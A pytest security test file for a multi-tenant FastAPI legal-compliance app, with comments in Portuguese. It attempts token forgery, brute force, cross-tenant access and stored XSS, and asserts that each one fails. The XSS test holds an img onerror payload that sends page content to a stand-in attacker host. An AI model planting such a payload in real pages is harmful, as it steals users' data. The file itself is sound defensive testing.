"""A camada de segurança, exercitada (§31, §33).

Cada teste aqui corresponde a uma forma concreta de invadir o sistema. Não são
testes de "a função existe": são a tentativa de ataque, e a prova de que ela
falha.
"""
from __future__ import annotations

import datetime as dt
import os

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.core.config import CHAVE_DE_DESENVOLVIMENTO, Settings, get_settings
from app.core.db import Base, get_db
from app.core.security import criar_token, hash_senha, conferir_senha
from app.main import app
from app.models import Base as ModelosBase  # noqa: F401
from app.seeds.carga import popular


@pytest.fixture
def cliente(tmp_path):
    engine = create_engine(f"sqlite+pysqlite:///{tmp_path / 'seg.db'}",
                           connect_args={"check_same_thread": False})
    Base.metadata.create_all(engine)
    Sessao = sessionmaker(bind=engine, autoflush=False, autocommit=False)
    with Sessao() as db:
        popular(db, com_demonstracao=True)

    def _db():
        db = Sessao()
        try:
            yield db
        finally:
            db.close()

    app.dependency_overrides[get_db] = _db
    with TestClient(app) as c:
        yield c
    app.dependency_overrides.clear()


def entrar(cliente, senha="terceiro360"):
    return cliente.post(
        "/api/v1/auth/login",
        data={"username": "admin@demo.terceiro360.local", "password": senha},
    )


# ---------------------------------------------------------------- sessão


def test_api_nao_responde_sem_token(cliente):
    for caminho in ("/api/v1/entidades", "/api/v1/pendencias", "/api/v1/normativo/fontes"):
        assert cliente.get(caminho).status_code == 401, caminho


def test_token_forjado_com_outra_chave_e_recusado(cliente):
    """O ataque óbvio: assinar o próprio token."""
    from jose import jwt

    usuario = entrar(cliente).json()
    del usuario
    falso = jwt.encode(
        {"sub": "00000000-0000-0000-0000-000000000001",
         "cli": "00000000-0000-0000-0000-000000000002",
         "exp": dt.datetime.now(dt.timezone.utc) + dt.timedelta(hours=1)},
        "chave-do-atacante",
        algorithm="HS256",
    )
    r = cliente.get("/api/v1/entidades", headers={"Authorization": f"Bearer {falso}"})
    assert r.status_code == 401


def test_token_expirado_nao_serve(cliente):
    from jose import jwt
    from app.core.config import settings

    vencido = jwt.encode(
        {"sub": "00000000-0000-0000-0000-000000000001",
         "cli": "00000000-0000-0000-0000-000000000002",
         "exp": dt.datetime.now(dt.timezone.utc) - dt.timedelta(minutes=1)},
        settings.secret_key,
        algorithm="HS256",
    )
    assert cliente.get(
        "/api/v1/entidades", headers={"Authorization": f"Bearer {vencido}"}
    ).status_code == 401


def test_senha_nao_e_guardada_nem_reversivel():
    hash_ = hash_senha("terceiro360")
    assert "terceiro360" not in hash_
    assert hash_.startswith("$2")           # bcrypt
    assert conferir_senha("terceiro360", hash_)
    assert not conferir_senha("terceiro36", hash_)
    # Sal aleatório: dois usuários com a mesma senha têm hashes diferentes.
    assert hash_ != hash_senha("terceiro360")


# ------------------------------------------------------------ força bruta


def test_forca_bruta_e_travada_apos_cinco_tentativas(cliente):
    for _ in range(5):
        assert entrar(cliente, "errada").status_code == 401

    bloqueado = entrar(cliente, "errada")
    assert bloqueado.status_code == 429
    assert "Aguarde" in bloqueado.json()["detail"]

    # E o bloqueio vale mesmo com a senha certa: quem está travado está travado.
    assert entrar(cliente).status_code == 429


def test_tentativa_negada_fica_registrada(cliente):
    from sqlalchemy import select
    from app.modules.compliance.models import LogAcesso

    entrar(cliente, "errada")
    db = next(app.dependency_overrides[get_db]())
    negadas = db.scalars(
        select(LogAcesso).where(LogAcesso.resultado == "NEGADO")
    ).all()
    assert negadas, "tentativa de invasão sem rastro é meio caminho andado"
    assert negadas[0].acao == "LOGIN"


# ----------------------------------------------- isolamento entre clientes


def test_um_cliente_nao_alcanca_a_entidade_de_outro(cliente):
    """O risco central do multi-inquilino: vazar dado entre escritórios.

    O intruso aqui não é um curioso sem permissão — é **administrador pleno do
    próprio escritório**. É o cenário que importa: permissão total não pode
    valer um centímetro além das entidades do seu cliente.
    """
    from sqlalchemy import select
    from app.modules.identity.models import Cliente, Perfil, Usuario, UsuarioPerfil
    from app.core.security import hash_senha as _hash

    db = next(app.dependency_overrides[get_db]())
    entidade_alheia = cliente.get(
        "/api/v1/entidades", headers=_auth(cliente)
    ).json()[0]["id"]

    intruso_cliente = Cliente(nome="Escritório Intruso", documento="00.000.000/0001-00")
    db.add(intruso_cliente)
    db.flush()
    intruso = Usuario(
        cliente_id=intruso_cliente.id, nome="Intruso",
        email="intruso@exemplo.local", senha_hash=_hash("intruso123"), ativo=True,
    )
    db.add(intruso)
    db.flush()
    administrador = db.scalar(select(Perfil).where(Perfil.codigo == "ADMINISTRADOR"))
    db.add(UsuarioPerfil(usuario_id=intruso.id, perfil_id=administrador.id))
    db.commit()

    token = cliente.post(
        "/api/v1/auth/login",
        data={"username": "intruso@exemplo.local", "password": "intruso123"},
    ).json()["access_token"]
    cabecalho = {"Authorization": f"Bearer {token}"}

    # Não vê nada na listagem…
    assert cliente.get("/api/v1/entidades", headers=cabecalho).json() == []
    # …e nem pedindo o identificador direto, que é o que um atacante faria.
    for caminho in (
        f"/api/v1/entidades/{entidade_alheia}",
        f"/api/v1/entidades/{entidade_alheia}/documentos",
        f"/api/v1/entidades/{entidade_alheia}/associados",
        f"/api/v1/entidades/{entidade_alheia}/protocolos",
    ):
        assert cliente.get(caminho, headers=cabecalho).status_code == 404, caminho


def _auth(cliente):
    return {"Authorization": f"Bearer {entrar(cliente).json()['access_token']}"}


# ------------------------------------------------------------------- XSS


def test_dado_do_usuario_nao_vira_html_no_documento():
    """XSS armazenado: o texto do documento é renderizado como HTML na tela."""
    from app.engines.templates.motor import MARCADOR_LACUNA, marcar_lacunas_html

    ataque = '<img src=x onerror="fetch(\'https://atacante/\'+document.body.innerHTML)">'
    saida = marcar_lacunas_html(f"Razão social: {ataque} {MARCADOR_LACUNA}")

    assert "<img" not in saida
    assert "&lt;img" in saida
    # E o realce da lacuna continua funcionando.
    assert '<mark class="lacuna">' in saida


# ------------------------------------------------- configuração perigosa


def test_producao_nao_sobe_com_a_chave_do_repositorio(monkeypatch):
    """A falha mais cara possível: subir assinando sessão com chave pública."""
    monkeypatch.setenv("T360_ENVIRONMENT", "production")
    monkeypatch.delenv("T360_SECRET_KEY", raising=False)
    monkeypatch.setenv("T360_CHAVE_DADOS", "d" * 64)
    monkeypatch.setenv("T360_DEBUG", "false")
    get_settings.cache_clear()
    with pytest.raises(RuntimeError, match="T360_SECRET_KEY"):
        get_settings()
    get_settings.cache_clear()


def test_producao_nao_sobe_com_a_chave_de_dados_padrao(monkeypatch):
    """Com ela, qualquer cópia do banco entrega os CPFs em claro."""
    monkeypatch.setenv("T360_ENVIRONMENT", "production")
    monkeypatch.setenv("T360_SECRET_KEY", "k" * 64)
    monkeypatch.delenv("T360_CHAVE_DADOS", raising=False)
    monkeypatch.setenv("T360_DEBUG", "false")
    get_settings.cache_clear()
    with pytest.raises(RuntimeError, match="T360_CHAVE_DADOS"):
        get_settings()
    get_settings.cache_clear()


def test_producao_recusa_chave_curta_e_debug_ligado(monkeypatch):
    monkeypatch.setenv("T360_ENVIRONMENT", "production")
    monkeypatch.setenv("T360_CHAVE_DADOS", "d" * 64)
    monkeypatch.setenv("T360_SECRET_KEY", "curta")
    monkeypatch.setenv("T360_DEBUG", "false")
    get_settings.cache_clear()
    with pytest.raises(RuntimeError, match="curta demais"):
        get_settings()

    monkeypatch.setenv("T360_SECRET_KEY", "k" * 64)
    monkeypatch.setenv("T360_DEBUG", "true")
    get_settings.cache_clear()
    with pytest.raises(RuntimeError, match="T360_DEBUG"):
        get_settings()
    get_settings.cache_clear()


def test_cors_nao_libera_qualquer_origem():
    """Com credenciais, "*" deixaria qualquer site agir como o usuário logado."""
    origens = Settings().cors_origens
    assert "*" not in origens
    assert all(o.startswith("http://localhost") or o.startswith("https://")
               or o.startswith("http://127.0.0.1") for o in origens)


# ----------------------------------------------------- dado pessoal cifrado


def test_cpf_nao_esta_em_texto_puro_no_banco(cliente):
    """O teste que importa: ler a tabela por fora e não achar o número.

    É o cenário real de vazamento — string de conexão exposta, backup baixado,
    acesso administrativo indevido. A cifragem em disco do provedor não protege
    nenhum desses.
    """
    from sqlalchemy import select, text
    from app.modules.juridico.models import Pessoa

    db = next(app.dependency_overrides[get_db]())
    pessoa = db.scalars(select(Pessoa).where(Pessoa.cpf.isnot(None))).first()
    assert pessoa is not None and pessoa.cpf, "a carga de demonstração cadastra pessoas com CPF"
    cpf_em_claro = pessoa.cpf

    # Consulta crua, sem passar pelo mapeamento que decifra.
    cru = db.execute(
        text("SELECT cpf, cpf_indice FROM pessoas WHERE id = :i"), {"i": str(pessoa.id)}
    ).one()

    assert cpf_em_claro not in cru[0]
    assert cru[0].startswith("cif:")
    # E os dígitos sozinhos também não aparecem, com ou sem pontuação.
    assert "".join(c for c in cpf_em_claro if c.isdigit()) not in cru[0]
    assert cpf_em_claro not in (cru[1] or "")


def test_o_sistema_continua_achando_a_pessoa_pelo_cpf(cliente):
    """Cifrar sem quebrar a busca é o ponto todo do índice cego."""
    from sqlalchemy import select
    from app.core.cifra import indice
    from app.modules.juridico.models import Pessoa

    db = next(app.dependency_overrides[get_db]())
    pessoa = db.scalars(select(Pessoa).where(Pessoa.cpf.isnot(None))).first()

    achada = db.scalar(select(Pessoa).where(Pessoa.cpf_indice == indice(pessoa.cpf)))
    assert achada is not None and achada.id == pessoa.id

    # Mesmo CPF digitado sem pontuação encontra a mesma pessoa.
    so_digitos = "".join(c for c in pessoa.cpf if c.isdigit())
    assert db.scalar(select(Pessoa).where(Pessoa.cpf_indice == indice(so_digitos))).id == pessoa.id


def test_indice_do_cpf_nao_e_reversivel_por_forca_bruta():
    """Um SHA simples do CPF cairia: são 10^11 combinações e há lista pronta."""
    import hashlib
    from app.core.cifra import indice

    cpf = "123.456.789-00"
    assert indice(cpf) != hashlib.sha256(b"12345678900").hexdigest()
    assert indice(cpf) == indice("12345678900")
    assert indice(None) is None and indice("") is None


def test_mascara_esconde_o_suficiente():
    from app.core.cifra import mascarar

    assert mascarar("123.456.789-00") == "***.456.789-**"


# ------------------------------------------------------- política de senha


def test_senha_fraca_e_recusada_na_troca(cliente):
    cabecalho = _auth(cliente)
    for fraca in ("123456", "terceiro360", "aaaaaaaaaaaa", "admin@demo.terceiro360"):
        r = cliente.post("/api/v1/auth/senha", headers=cabecalho,
                         json={"senha_atual": "terceiro360", "senha_nova": fraca})
        assert r.status_code == 422, f"{fraca} passou"


def test_troca_de_senha_exige_a_senha_atual(cliente):
    r = cliente.post("/api/v1/auth/senha", headers=_auth(cliente),
                     json={"senha_atual": "errada", "senha_nova": "chuva-de-agosto-no-cerrado"})
    assert r.status_code == 401


def test_troca_de_senha_funciona_e_a_antiga_para_de_valer(cliente):
    nova = "vento-norte-na-serra-2026"
    assert cliente.post("/api/v1/auth/senha", headers=_auth(cliente),
                        json={"senha_atual": "terceiro360", "senha_nova": nova}
                        ).status_code == 200
    assert entrar(cliente, "terceiro360").status_code == 401
    assert entrar(cliente, nova).status_code == 200


# ------------------------------------------------------------------- MFA


def test_mfa_so_liga_depois_de_a_pessoa_provar_que_le_o_codigo(cliente):
    """Ligar antes da confirmação trancaria quem errou a leitura do QR."""
    import pyotp

    cabecalho = _auth(cliente)
    inicio = cliente.post("/api/v1/auth/mfa/iniciar", headers=cabecalho).json()
    assert inicio["uri"].startswith("otpauth://totp/TERCEIRO360")
    assert cliente.get("/api/v1/auth/mfa", headers=cabecalho).json()["habilitado"] is False

    errado = cliente.post("/api/v1/auth/mfa/confirmar", headers=cabecalho,
                          json={"codigo": "000000"})
    assert errado.status_code == 401
    assert cliente.get("/api/v1/auth/mfa", headers=cabecalho).json()["habilitado"] is False

    certo = cliente.post("/api/v1/auth/mfa/confirmar", headers=cabecalho,
                         json={"codigo": pyotp.TOTP(inicio["segredo"]).now()})
    assert certo.status_code == 200
    assert len(certo.json()["codigos_recuperacao"]) == 8


def test_com_mfa_ligado_a_senha_sozinha_nao_entra(cliente):
    import pyotp

    cabecalho = _auth(cliente)
    segredo = cliente.post("/api/v1/auth/mfa/iniciar", headers=cabecalho).json()["segredo"]
    recuperacao = cliente.post(
        "/api/v1/auth/mfa/confirmar", headers=cabecalho,
        json={"codigo": pyotp.TOTP(segredo).now()},
    ).json()["codigos_recuperacao"]

    # Senha certa, sem código: barrado, e sinalizado como falta de segundo fator.
    so_senha = entrar(cliente)
    assert so_senha.status_code == 401
    assert so_senha.headers.get("X-MFA-Exigido") == "1"

    # Com o código: entra.
    com_codigo = cliente.post(
        "/api/v1/auth/login",
        data={"username": "admin@demo.terceiro360.local", "password": "terceiro360",
              "client_secret": pyotp.TOTP(segredo).now()},
    )
    assert com_codigo.status_code == 200

    # Código de recuperação vale uma vez, e só uma.
    assert cliente.post(
        "/api/v1/auth/login",
        data={"username": "admin@demo.terceiro360.local", "password": "terceiro360",
              "client_secret": recuperacao[0]},
    ).status_code == 200
    assert cliente.post(
        "/api/v1/auth/login",
        data={"username": "admin@demo.terceiro360.local", "password": "terceiro360",
              "client_secret": recuperacao[0]},
    ).status_code == 401


def test_desligar_mfa_exige_senha(cliente):
    import pyotp

    cabecalho = _auth(cliente)
    segredo = cliente.post("/api/v1/auth/mfa/iniciar", headers=cabecalho).json()["segredo"]
    cliente.post("/api/v1/auth/mfa/confirmar", headers=cabecalho,
                 json={"codigo": pyotp.TOTP(segredo).now()})

    assert cliente.post("/api/v1/auth/mfa/desativar", headers=cabecalho,
                        json={"senha_atual": "errada", "senha_nova": "x"}).status_code == 401
    assert cliente.post("/api/v1/auth/mfa/desativar", headers=cabecalho,
                        json={"senha_atual": "terceiro360", "senha_nova": "x"}).status_code == 200


# ------------------------------------------------------- cabeçalhos e freio


def test_toda_resposta_leva_os_cabecalhos_de_defesa(cliente):
    r = cliente.get("/saude")
    assert r.headers["X-Content-Type-Options"] == "nosniff"
    assert r.headers["X-Frame-Options"] == "DENY"          # clickjacking
    assert "frame-ancestors 'none'" in r.headers["Content-Security-Policy"]
    assert r.headers["Referrer-Policy"] == "strict-origin-when-cross-origin"
    # HSTS só em produção: em localhost trancaria o navegador do programador.
    assert "Strict-Transport-Security" not in r.headers


def test_documentacao_interativa_fecha_em_producao(monkeypatch):
    """/docs entrega o mapa completo da API de graça."""
    from app.core.config import Settings

    assert Settings(environment="production").em_producao is True
    assert Settings(environment="development").em_producao is False
